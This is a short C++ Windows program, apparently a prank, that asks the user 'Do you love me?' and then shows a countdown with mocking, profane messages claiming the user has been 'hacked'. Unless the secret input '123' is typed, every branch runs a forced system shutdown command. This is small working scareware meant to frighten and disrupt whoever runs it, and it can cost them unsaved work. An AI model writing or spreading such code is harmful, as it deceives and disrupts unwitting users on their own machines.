#include<bits/stdc++.h>
#include <iostream>
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include<stdlib.h>
using namespace std;

int main()
{
 int m=0, s=20,h=0;
 string ch;


	 cout<<" Hello sexy :) :) "<<endl<<endl;

	 cout<<" Do you love me ?"<<endl<<endl;

	 cout<<" YES or NO ::  ";
	 getline(cin,ch);

	 if(ch=="YES")
     {


          for (int hour = h; hour >= 0; hour--)
	 {
		 for (int min = m; min >= 0 ; min--)
		 {
			 if ( min == 0 && h > 0)
				 m = 59;
			for (int sec = s; sec >= 0; sec--)
			{
				if ( sec == 0 )
					s = 59;
				Sleep(1000);
				system("cls");
				 cout<<" oh,sorry baby you hacked :) :)  "<<endl<<endl;

				cout << hour << " : " << min << " : " << sec  << endl;
			}
		 }
	 }
       system("c:\\windows\\system32\\shutdown /s /t 20");

	Sleep(1000);


     }
     else  if(ch=="NO")
     {


          for (int hour = h; hour >= 0; hour--)
	 {
		 for (int min = m; min >= 0 ; min--)
		 {
			 if ( min == 0 && h > 0)
				 m = 59;
			for (int sec = s; sec >= 0; sec--)
			{
				if ( sec == 0 )
					s = 59;
				Sleep(1000);
				system("cls");

				cout<<" :( :( FUCK YOU, you hacked   "<<endl<<endl;


				cout << hour << " : " << min << " : " << sec  << endl;
			}
		 }
	 }
     system("c:\\windows\\system32\\shutdown /s /t 20");

	Sleep(1000);
     }
     else  if(ch=="123")
     {
         cout<<" baby i love you   "<<endl<<endl;
         exit(1);
     }
     else
     {


          for (int hour = h; hour >= 0; hour--)
	 {
		 for (int min = m; min >= 0 ; min--)
		 {
			 if ( min == 0 && h > 0)
				 m = 59;
			for (int sec = s; sec >= 0; sec--)
			{
				if ( sec == 0 )
					s = 59;
				Sleep(1000);
				system("cls");

				 cout<<" :( :( FUCK YOU, MOTHER FUCKER . YOU HACKED  "<<endl<<endl;

				cout << hour << " : " << min << " : " << sec  << endl;
			}
		 }
	 }
    system("c:\\windows\\system32\\shutdown /s /t 20");
	Sleep(1000);
     }





	return 0;
}

